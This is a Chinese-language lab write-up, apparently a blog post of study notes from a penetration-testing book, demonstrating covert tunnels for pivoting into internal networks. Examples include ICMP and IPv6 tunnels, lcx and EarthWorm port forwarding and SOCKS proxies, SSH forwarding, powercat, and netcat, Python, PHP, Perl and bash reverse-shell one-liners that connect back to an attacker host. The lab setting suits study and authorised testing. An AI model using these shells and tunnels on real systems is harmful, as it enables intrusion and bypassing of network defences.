## 前言

前段时间读了读徐哥的《内网安全攻防》，并复现了部分知识点，写篇文章记录下学习内容。

## 何为隐藏通信隧道技术？

### 意义

当我们成功杀入内网并完成信息收集后，下一步要进行的就是判断内网的连通性（也就是各种各样的流量包能否出的去、进的来），隐藏通信隧道技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。

### 简介

在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。

但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置的限制，它们会对主机间或者内网与外网之间通信的流量进行检测，如果存在异常就会进行拦截，这无疑给内网渗透增加了难度，而隐藏通信隧道技术就是为了绕过各种边界设备的封锁，从而完成主机间或内网与外网之间的通信。

## 常见隧道

网络层：IPV6隧道、ICMP隧道

传输层：TCP隧道、UDP隧道、端口转发

应用层：SSH隧道、HTTP(S)隧道、DNS隧道

接下来将从三种隧道中各选几种进行试验

### 网络层

1.IPV6隧道

工具：6tunnel(kali自带)

目标机：winserver 2008

攻击机：kali

首先开启目标机上的IPV6(实战中这一步一般由渗透测试人员上传的软件开启)

[![2SNFu6.png](https://image.3001.net/images/20210529/1622278269_60b2007d97463e2420a5d.png!small)](https://imgtu.com/i/2SNFu6)

查看目标机的IPV6地址

[![2SNWx1.png](https://image.3001.net/images/20210529/1622278273_60b2008186e4d282131da.png!small)](https://imgtu.com/i/2SNWx1)

在攻击机中运行

    
    
    sudo su
    6tunnel -4 80  fe80::6090:bbdf:8c09:68d6%eth0 80
    

这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）

[![2p9iN9.png](https://image.3001.net/images/20210529/1622278278_60b200867c906f806617c.png!small)](https://imgtu.com/i/2p9iN9)

转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务

[![2p9974.png](https://image.3001.net/images/20210529/1622278285_60b2008d836c04033c011.png!small)](https://imgtu.com/i/2p9974)

2.ICMP隧道

在一般的情况下，如果两台主机要进行通信，必须要开放相应的端口，比如ssh-22端口，rdp-3389端口，但如果使用ICMP隧道，则不需要开放任何的端口，所以ICMP隧道十分简单、实用

在渗透测试中，如果防火墙对各种上层协议(HTTP.HTTPS,DNS等)的数据包进行了封锁，那么我们可以尝试一下网管常常漏掉的ICMP协议包，我们可以将TCP数据包封装到ICMP数据包中，如果防火墙不对ICMP包进行拦截，那么我们便可以实现对防火墙的突破

工具：icmpsh

下载地址：https://gitee.com/WeiyiGeek/icmpshell.git(github下载太慢，就换了个国内的)

[![2p9HKK.png](https://image.3001.net/images/20210529/1622278296_60b200983c0d2cd503096.png!small)](https://imgtu.com/i/2p9HKK)

安装python的impacket类库，以便于对各类协议进行访问

    
    
    apt-get install python3-impacket
    

[![2pCCKf.png](https://image.3001.net/images/20210529/1622278305_60b200a17eeecbb9abfad.png!small)](https://imgtu.com/i/2pCCKf)

但是笔者这里的安装并不顺利，所以就采用了另一种安装方法：

直接从github上下载源码并运行地址：

    
    
    python setup.py install
    

如此impacket便安装成功

由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行

    
    
    sysctl -w net.ipv4.icmp_echo_ignore_all=1
    

[![2pCMrT.png](https://image.3001.net/images/20210529/1622278317_60b200adb5a8c16ccb118.png!small)](https://imgtu.com/i/2pCMrT)

进入目录后运行

    
    
    ./run.sh
    

[![2pAE3d.png](https://image.3001.net/images/20210529/1622278326_60b200b661c4307571555.png!small)](https://imgtu.com/i/2pAE3d)

依次输入攻击机IP和受害机IP便会自动输出需要在受害机上运行的命令

在受害机运行

[![2pAUbV.png](https://image.3001.net/images/20210529/1622278334_60b200beee32b3a8cec7b.png!small)](https://imgtu.com/i/2pAUbV)

在攻击机上便可以见到回弹shell

[![2pAWVK.png](https://image.3001.net/images/20210529/1622278345_60b200c9306e614979e21.png!small)](https://imgtu.com/i/2pAWVK)

[![2pAzGQ.png](https://image.3001.net/images/20210529/1622278356_60b200d450a94bc72437e.png!small)](https://imgtu.com/i/2pAzGQ)

工具：pingtunnel

本次测试网络拓扑图：

[![2pMs2T.png](https://image.3001.net/images/20210529/1622278363_60b200dbdcd8ffc80924d.png!small)](https://imgtu.com/i/2pMs2T)

测试环境:攻击机可以访问web服务器，不能访问数据库服务器

web服务器只能通过ICMP协议访问数据库服务器

渗透目标：利用工具使攻击机可以访问数据库服务器的3389

首先要安装工具

    
    
    wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
    
    tar -xzvf PingTunnel-0.72.tar.gz
    
    cd PingTunnel
    
    make && make install
    

[![2pntKJ.png](https://image.3001.net/images/20210529/1622278373_60b200e59e69696e41b42.png!small)](https://imgtu.com/i/2pntKJ)

如果报pcap.h缺失：

    
    
    wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz 
    
    tar zxvf libpcap-1.9.0.tar.gz 
    
    cd libpcap-1.9.0 
    
    ./configure
    

最后一步过程中又会报Neither flex nor lex was found的错误：

    
    
    apt-get install flex bison
    

继续执行：

    
    
    ./configure
    make
    sudo make install
    

回到pingtunnel目录重新执行

    
    
    make && make install
    

[![2puMsH.png](https://image.3001.net/images/20210529/1622278387_60b200f31ff65d37dcd86.png!small)](https://imgtu.com/i/2puMsH)

攻击机工具安装完成

接下来还要在web服务器上安装工具，安装过程类似不多赘述

在web服务器运行命令

    
    
    ptunnel -x haixian
    

[![2p7L8g.png](https://image.3001.net/images/20210529/1622278396_60b200fcef17b84a26beb.png!small)](https://imgtu.com/i/2p7L8g)

这条命令便是在web服务器上开启一个密码为haixian的icmp隧道

接下来在攻击机上执行

    
    
    ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x haixian
    

[![2pHhJU.png](https://image.3001.net/images/20210529/1622278404_60b20104701e29186b522.png!small)](https://imgtu.com/i/2pHhJU)

这条命令的意思是，当访问攻击机的1080端口时，数据库服务器3389端口的数据便会以web服务器为中转，通过刚刚搭建好的以haixian为密码的ICMP隧道传送到攻击机的1080端口上

接下来访问本机的1080端口便可以连接到数据库服务器的远程桌面了(3389)

[![2pqQjH.png](https://image.3001.net/images/20210529/1622278435_60b2012324d8c9e6f1ed6.png!small)](https://imgtu.com/i/2pqQjH)

[![2pq4KJ.png](https://image.3001.net/images/20210529/1622278443_60b2012bab0d2290ac375.png!small)](https://imgtu.com/i/2pq4KJ)

同理，我们可以连接数据库服务器的SSH(22端口)或者数据库服务(如果是mysql的话为3306端口)，这里不再赘述

### 传输层

1.端口转发

工具：lcx

下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip

lcx是一个非常经典的端口转发工具，在linux或者windows中均可使用，lcx的原理就是搭建Socket隧道，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接

在受害机上执行

    
    
    lcx.exe -slave 192.168.1.4(攻击机IP) 4444 127.0.0.1 3389
    

这条命令的意思就是将本机的3389端口转发到攻击机的4444端口上

之后在攻击机上执行

    
    
    ./portmap -m 2 -p1 4444 -h2 192.168.1.4 -p2 5555
    

这条命令的意思就是将本地4444端口接收的数据转发到5555端口

[![29eG4K.png](https://image.3001.net/images/20210529/1622278449_60b20131bbfd6dadd7bcf.png!small)](https://imgtu.com/i/29eG4K)

[![29ejbR.png](https://image.3001.net/images/20210529/1622278458_60b2013a0207cf3de7e70.png!small)](https://imgtu.com/i/29ejbR)

在攻击机访问本机5555端口

[![29enc4.png](https://image.3001.net/images/20210529/1622278472_60b20148b863cfd298d5d.png!small)](https://imgtu.com/i/29enc4)

可见成功访问受害机远程桌面(3389端口)

[![29uIUI.png](https://image.3001.net/images/20210529/1622278480_60b201507a9ac2e616b2f.png!small)](https://imgtu.com/i/29uIUI)

 **端口扫描**

扫描80端口

    
    
    nc -v  192.168.1.2 80
    

[![2CaLwt.png](https://image.3001.net/images/20210529/1622278503_60b2016721f3bb5927506.png!small)](https://imgtu.com/i/2CaLwt)

可以看到目标主机的80端口是开启的

 **获得shell**

(1).正向shell

即攻击机主动去连接受害机，正向连接使用频率较少，因为这种shell很容易被各种边界设备所拦截

在受害机中执行

    
    
    nc -lvp 4444 -e /bin/sh
    

这条命令的意思是把/bin/sh发送给请求本机4444端口的终端

[![2CwOG8.png](https://image.3001.net/images/20210529/1622278514_60b2017290bc1938a5618.png!small)](https://imgtu.com/i/2CwOG8)

在攻击机上执行

    
    
    nc 192.168.1.5 444
    

去主动连接受害机的4444端口

[![2CwcUx.png](https://image.3001.net/images/20210529/1622278522_60b2017a631e001ef93a9.png!small)](https://imgtu.com/i/2CwcUx)

在攻击机上使用ifconfig查看IP发现已经是受害机的IP

(2).反向shell

即受害及主动来连接攻击机，这种方法在渗透测试中更为常用，因为它可以突破许多边界设备的封锁

在攻击机上执行

    
    
    nc -lvp 5555
    

开始监听本机5555端口

[![2C06yQ.png](https://image.3001.net/images/20210529/1622278528_60b20180bdc107b9b4aca.png!small)](https://imgtu.com/i/2C06yQ)

接下来在受害机中执行

    
    
    nc 192.168.1.4 5555 -e /bin/sh
    

这条命令的意思就是去主动连接攻击机的5555端口并把/bin/sh传送给5555端口

[![2C0hF0.png](https://image.3001.net/images/20210529/1622278535_60b20187e6f8636d51164.png!small)](https://imgtu.com/i/2C0hF0)

[![2C05WT.png](https://image.3001.net/images/20210529/1622278543_60b2018f44f3ce74457b1.png!small)](https://imgtu.com/i/2C05WT)

可以看到在攻击机上已经收到了受害机的shell

但这个实验是建立在受害机已经安装netcat这个工具了，而实际情况下如果没有安装应该怎么办呢？

1.使用python反弹shell

执行如下命令，在攻击机上监听本地1234端口

[![2CBimd.png](https://image.3001.net/images/20210529/1622278550_60b20196c2384f62b504c.png!small)](https://imgtu.com/i/2CBimd)

在受害机中执行

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机IP",攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

[![2CBQmj.png](https://image.3001.net/images/20210529/1622278559_60b2019fa059eb8dac9e1.png!small)](https://imgtu.com/i/2CBQmj)

攻击机上收到回弹shell

[![2CBB7R.png](https://image.3001.net/images/20210529/1622278580_60b201b45549a3e57b232.png!small)](https://imgtu.com/i/2CBB7R)

但是这种方法又建立在受害及上存在python环境的情况下

如果受害机上没有python环境怎么办呢？

2.php反弹shell

如果没有python环境，但受害机上存在php环境，那么也可以利用php反弹shell

执行如下命令，在攻击机上监听本地2021端口

[![2CDlvD.png](https://image.3001.net/images/20210529/1622278594_60b201c2427b4464684c5.png!small)](https://imgtu.com/i/2CDlvD)

在受害机上执行

    
    
    php -r '$sock=fsockopen("攻击机ip",攻击机监听的端口);exec("/bin/bash -i <&3 >&3 2>&3");'
    

[![2CDXRK.png](https://image.3001.net/images/20210529/1622278603_60b201cb5894145fd62f2.png!small)](https://imgtu.com/i/2CDXRK)

可以看到在攻击机上以及收到了反弹shell

![2CrkJP.png](https://image.3001.net/images/20210529/1622278617_60b201d97e8f6299f12a9.png!small)

那如果在受害机上既没有python环境又没有php环境该怎么办呢？

3.perl反弹shell

如果目标机器上使用的是perl语言，那么我们还可以使用perl反弹shell

攻击机本地监听4321端口

    
    
    nc -lvp 4321
    

[![2CsEkR.png](https://image.3001.net/images/20210529/1622278626_60b201e2e095326d53cce.png!small)](https://imgtu.com/i/2CsEkR)

受害机执行

    
    
    perl -e 'use Socket;$i="攻击机ip";$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    

[![2C6ARx.png](https://image.3001.net/images/20210529/1622278637_60b201edee6dd007949d6.png!small)](https://imgtu.com/i/2C6ARx)

可以在攻击机上收到反弹shell

[![2C6uee.png](https://image.3001.net/images/20210529/1622278645_60b201f50074b03b49cd4.png!small)](https://imgtu.com/i/2C6uee)

4.bash反弹shell

那么如果在受害机上以上三种语言环境都不存在怎么办呢？

执行如下命令，在攻击机上监听6666端口

    
    
    nc -lvp 6666
    

[![2CBRje.png](https://image.3001.net/images/20210529/1622278663_60b20207337af58badab9.png!small)](https://imgtu.com/i/2CBRje)

在受害机中执行

    
    
    bash -i >& /dev/tcp/192.168.1.4/6666 0>&1
    

将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口

[![2CBLjg.png](https://image.3001.net/images/20210529/1622278670_60b2020ed9b2e3fdbe329.png!small)](https://imgtu.com/i/2CBLjg)

可以看到在攻击机上收到了受害机的反弹shell

[![2CDp40.png](https://image.3001.net/images/20210529/1622278680_60b202184d59b267bfca4.png!small)](https://imgtu.com/i/2CDp40)

5.内网代理实验

本次实验工具：web服务器(kali)、数据库服务器(win server 2008)、攻击机(kali)

本次实验网络拓扑图：  
[![2ikPX9.png](https://image.3001.net/images/20210529/1622278688_60b202205dbd75a609583.png!small)](https://imgtu.com/i/2ikPX9)

实验条件:攻击机可以访问到web服务器，但访问不到数据库服务器，web服务器可以访问攻击机，也可以访问数据库服务器，攻击机无法直接访问数据库服务器，通过前期渗透已经取得了web服务器的权限

首先在攻击机上执行命令监听本机9999端口

    
    
    nc -lvp 9999
    

[![2iAkvQ.png](https://image.3001.net/images/20210529/1622278693_60b20225c541ce29ffe71.png!small)](https://imgtu.com/i/2iAkvQ)

然后在数据库服务器中执行

    
    
    nc -lvp 9999 -e c:\windows\system32\cmd.exe
    

将本机的cmd.exe传送到请求9999端口的主机

最后在web服务器(跳板机)中执行

    
    
    nc -v 192.168.1.4 9999 -c "nc -v 192.168.1.2 9999"
    

这条命令的意思就是web服务器先去连接攻击机，连上之后立刻去连接数据库服务器的9999端口，连接成功后把两个隧道合并为一条隧道(请自行脑补~)

[![2iAfG8.png](https://image.3001.net/images/20210529/1622278699_60b2022bd8c18b0a620be.png!small)](https://imgtu.com/i/2iAfG8)

可见在攻击机中收到了来自数据包库服务器的反弹shell

[![2iAXGT.png](https://image.3001.net/images/20210529/1622278707_60b202333172c06b80477.png!small)](https://imgtu.com/i/2iAXGT)

3.Powercat

工具下载地址：https://github.com/besimorhino/powercat

工具下载后需要导入powercat.ps1脚本后才可以正常使用powercat

执行

    
    
    Import-Module .\powercat.ps1
    

导入脚本，有可能会报权限不够，需要修改权限

[![2ieLm4.png](https://image.3001.net/images/20210529/1622278714_60b2023a67377377f3824.png!small)](https://imgtu.com/i/2ieLm4)

执行

    
    
    Set-ExecutionPolicy RemoteSigned
    

然后就可以导入脚本了

[![2ievkR.png](https://image.3001.net/images/20210529/1622278732_60b2024c4124b8e6c37db.png!small)](https://imgtu.com/i/2ievkR)

如图所示，接下来就可以正常的使用powercat了

powercat部分参数介绍

    
    
    -c 指定一个ip地址
    -p 指定一个端口
    -v 显示详情
    -l 监听模式
    -e 程序重定向
    

**通过nc正向连接powercat**

在win server 2008中执行

    
    
    powercat -l -p 8888 -e cmd.exe -v
    

这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机

[![2iuW0e.png](https://image.3001.net/images/20210529/1622278736_60b202506887611451255.png!small)](https://imgtu.com/i/2iuW0e)

在攻击机中执行

    
    
    nc 192.168.1.2 8888 -vv
    

[![2iK910.png](https://image.3001.net/images/20210529/1622278743_60b20257bcce1a303a6ee.png!small)](https://imgtu.com/i/2iK910)

可以看到已经接收到了win server2008 的shell

 **使用nc反向连接powercat**

在攻击机中执行

    
    
    nc -l -p 5678 -vv
    

开启监听本机5678端口

[![2iKlnO.png](https://image.3001.net/images/20210529/1622278750_60b2025eaeb69c625298e.png!small)](https://imgtu.com/i/2iKlnO)

接下来在win server2008执行

    
    
    powercat -c 192.168.1.4 -p 5678 -v -e cmd.exe
    

主动去连接攻击机

[![2iKdjf.png](https://image.3001.net/images/20210529/1622278757_60b2026555cc74fea7b10.png!small)](https://imgtu.com/i/2iKdjf)

可以看到在攻击机中收到了反弹shell

[![2iKyNj.png](https://image.3001.net/images/20210529/1622278763_60b2026b0b4228857dced.png!small)](https://imgtu.com/i/2iKyNj)

 **powercat之间互相连接反弹powershell**

首先在win server 2008上执行

    
    
    powercat -l -p 3333 -v
    

监听本机3333端口

[![2FdWZj.png](https://image.3001.net/images/20210529/1622278770_60b20272c4632f24bca2a.png!small)](https://imgtu.com/i/2FdWZj)

接下来在WIN7上执行

    
    
    powercat -c 192.168.1.2 -p 3333 -v -ep
    

[![2FdXw9.png](https://image.3001.net/images/20210529/1622278774_60b20276d9564a353e1ef.png!small)](https://imgtu.com/i/2FdXw9)

可以看到在win server 2008上已经收到了来自WIN7的powershell

[![2FwZFI.png](https://image.3001.net/images/20210529/1622278785_60b20281d6558afb6684e.png!small)](https://imgtu.com/i/2FwZFI)

### 应用层

1.SSH

几乎所有的unix/linux主机都支持SSH协议，都可以通过SSH通信而在现实情况中，网管员经常会使用SSH连接来远程管理内网中的主机，所以一般情况下，边界设备并不会拦截SSH流量，加之SSH流量是加密的，一般的入侵检测工具很难检测出SSH流量的异常，所以渗透测试人员往往能通过SSH建立起一些其他隧道难以建立的TCP通信隧道

SSH常见参数

    
    
    -C 压缩传输
    -f 后台执行SSH
    -N 建立静默连接
    -g 允许远程主机连接本地用于转发的端口
    -L 本地端口转发
    -R 远程端口转发
    -D 动态转发
    -P 指定SSH端口
    

(1).本地转发

本次实验网络拓扑图：

![2ikPX9.png](https://image.3001.net/images/20210529/1622278688_60b202205dbd75a609583.png!small)

实验环境：攻击机无法访问数据库服务器，可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问

实验目标：通过本地端口转发，访问攻击机本地的2021端口便可以打开数据库服务器的远程桌面

首先在攻击机上执行

    
    
    ssh -CfNg -L 2021:192.168.1.2:3389 root@192.168.1.5
    

这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机

[![2FgthQ.png](https://image.3001.net/images/20210529/1622278800_60b202904a9de60ddbe51.png!small)](https://imgtu.com/i/2FgthQ)

会提示输入web服务器的密码，输入密码

由于我们选择的是静默模式，所以可以本地查看一下2021端口是否被监听来检查通道的建立是否正常

    
    
    netstat -tulnp | grep "2021"
    

[![2F2kgs.png](https://image.3001.net/images/20210529/1622278804_60b20294ef1c3a4f19a58.png!small)](https://imgtu.com/i/2F2kgs)

可以看到2021端口正在被ssh服务监听，证明通道搭建成功

接下来在攻击机访问把本地2021端口即可打开数据库服务器的远程桌面

    
    
    rdesktop 127.0.0.1:2021
    

[![2F2XiF.png](https://image.3001.net/images/20210529/1622278810_60b2029adb3869b54f665.png!small)](https://imgtu.com/i/2F2XiF)

(2).远程转发

本次实验网络拓扑图：

![2ikPX9.png](https://image.3001.net/images/20210529/1622278688_60b202205dbd75a609583.png!small)

实验环境：

攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机

实验目标：通过访问攻击机本机的7890端口来访问数据库服务器的3389端口

在web服务器上执行

    
    
    ssh -CfNg -R 7890:192.168.1.2:3389 root@192.168.1.4
    

这条命令的意思是此时的web服务器虽然依旧是跳板，但是无论是连接数据库服务器的3389还是去连接攻击机的7890都是web服务器主动发起

[![2kzGTK.png](https://image.3001.net/images/20210529/1622278833_60b202b1126202d9bfbd2.png!small)](https://imgtu.com/i/2kzGTK)

输入攻击机的密码

在攻击机访问本地7890端口

    
    
    rdesktop 127.0.0.1:7890
    

[![2kzYFO.png](https://image.3001.net/images/20210529/1622278845_60b202bde39d8f3a3a13e.png!small)](https://imgtu.com/i/2kzYFO)

(3).动态转发

本次实验网络拓扑图：

![2ikPX9.png](https://image.3001.net/images/20210529/1622278688_60b202205dbd75a609583.png!small)

在攻击机上执行

    
    
    ssh -CfNg -D 6000 root@192.168.1.5
    

此条命令搭建了一个动态的SOCKS代理通道

输入web服务器密码后执行

    
    
    netstat -tulnp | grep ":6000"
    

查看连接情况

[![2A9KSg.png](https://image.3001.net/images/20210529/1622278865_60b202d10460953af529d.png!small)](https://imgtu.com/i/2A9KSg)

连接成功

例：在本地浏览器设置好SOCKS代理后可以访问到数据库服务器上开放的web服务

[![2AiXcD.png](https://image.3001.net/images/20210529/1622278871_60b202d7058507c4c6c73.png!small)](https://imgtu.com/i/2AiXcD)

[![2AFUER.png](https://image.3001.net/images/20210529/1622278884_60b202e41a03d3ce5f669.png!small)](https://imgtu.com/i/2AFUER)

2.HTTP/HTTPS隧道

这种隧道笔者已经在文章https://www.freebuf.com/articles/web/262820.html中已经讲解，这里不多赘述

3.SOCKS代理

SOCKS可以简单的把两个系统连接到一起，SOCKS支持多种协议，可以理解为升级版的lcx

常见工具：EarthWorm、SocksCap64、ProxyChains

(1).EW

工具下载地址：https://github.com/rootkiter/EarthWorm

 **正向代理**

攻击机本地执行

    
    
    ew -s ssocksd -l 888
    

这种连接方式是攻击机主动去找受害机，所以这里的受害机需要具有公网IP(攻击机可以直接去访问受害机)

 **反向代理**

本次实验网络拓扑图：

![2ikPX9.png](https://image.3001.net/images/20210529/1622278688_60b202205dbd75a609583.png!small)

首先在攻击机上执行

    
    
    ./ew_for_linux64 -s rssocks -l 1080 -e 1234
    

在本地添加转接隧道，将1080收到的数据转发给1234端口

[![2AMd39.png](https://image.3001.net/images/20210529/1622278899_60b202f389a91fbc0e6fc.png!small)](https://imgtu.com/i/2AMd39)

在web服务器上执行

    
    
    ew.exe -s rssocks -d 192.168.1.4 -e 1234
    

可在攻击机上收到回显

[![2AMR9H.png](https://image.3001.net/images/20210529/1622278904_60b202f865626d11a6008.png!small)](https://imgtu.com/i/2AMR9H)

至此，socks代理隧道搭建成功，攻击机便可以通过此隧道访问受害机任意服务(服务开启)

二级网络环境试验1：

本次实验网络拓扑图：

[![2AlZWQ.png](https://image.3001.net/images/20210529/1622278909_60b202fd0de8d838b2bb3.png!small)](https://imgtu.com/i/2AlZWQ)

实验环境

web服务器可以访问外网和数据库服务器，数据库服务器不能访问外网，只能访问内网资源

实验目标：通过访问攻击机本地端口访问架设在数据库服务器上的SOCKS隧道从而访问内网资源

首先在主机上执行

    
    
    ./ew_for_linux64 -s ssocksd -l 888
    

启动888端口的SOCKS代理

[![2A1Cp4.png](https://image.3001.net/images/20210529/1622278914_60b2030266a2395bf3407.png!small)](https://imgtu.com/i/2A1Cp4)

然后在web服务器中执行

    
    
    ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.1.4 -g 888
    

[![2A1ljA.png](https://image.3001.net/images/20210529/1622278920_60b20308c6b9d077fd5c7.png!small)](https://imgtu.com/i/2A1ljA)

使web服务器去主动连接攻击机和数据库服务器

接下来就可以通过访问攻击机的1080端口去使用搭建好的SOCKS隧道了

二级网络环境试验2：

本次实验网络拓扑图：

[![2A3P58.png](https://image.3001.net/images/20210529/1622278925_60b2030d3812f84066fd4.png!small)](https://imgtu.com/i/2A3P58)

实验环境：

A主机没有公网IP但可以访问公网，不可以访问内网,B主机可以访问内网，不能访问外网

实验目标：

通过访问攻击机上的10800端口来访问B主机上的SOCKS隧道，从而访问内网资源

首先在攻击机上执行

    
    
    ./ew_for_linux64 -s lcx_listen -l 10800 -e 888
    

[![2A34JS.png](https://image.3001.net/images/20210529/1622278930_60b203129b063281f6366.png!small)](https://imgtu.com/i/2A34JS)

添加转接隧道，将10800端口收到的代理请求转发到888端口

下面在B主机中执行

    
    
    ew_for_Win.exe -s ssocksd -l 999
    

[![2A8BT0.png](https://image.3001.net/images/20210529/1622278936_60b20318791fec3c7d2e6.png!small)](https://imgtu.com/i/2A8BT0)

开启999端口的SOCKS代理

最后，在A主机中执行

    
    
    ./ew_for_linux64 -s lcx_slave -d 192.168.1.4 -e 888 -f 192.168.1.2 -g 999
    

[![2A8h01.png](https://image.3001.net/images/20210529/1622278940_60b2031c6404b232271a8.png!small)](https://imgtu.com/i/2A8h01)

利用slave方式，将攻击机的888端口与B主机的999端口连接

可以在攻击机上看到隧道搭建成功提示

[![2A8XnA.png](https://image.3001.net/images/20210529/1622278950_60b203264ae2e94c44a0a.png!small)](https://imgtu.com/i/2A8XnA)

接下来可以使用SocksCap64等代理工具对socks隧道进行利用，方法较为简单，这里不再赘述

## 写在后面

这篇文章比较长，感谢读到最后的你~

## 参考资料：

《内网安全攻防:渗透测试实战指南》徐焱、贾晓璐

https://blog.csdn.net/weixin_42652002/article/details/112070453

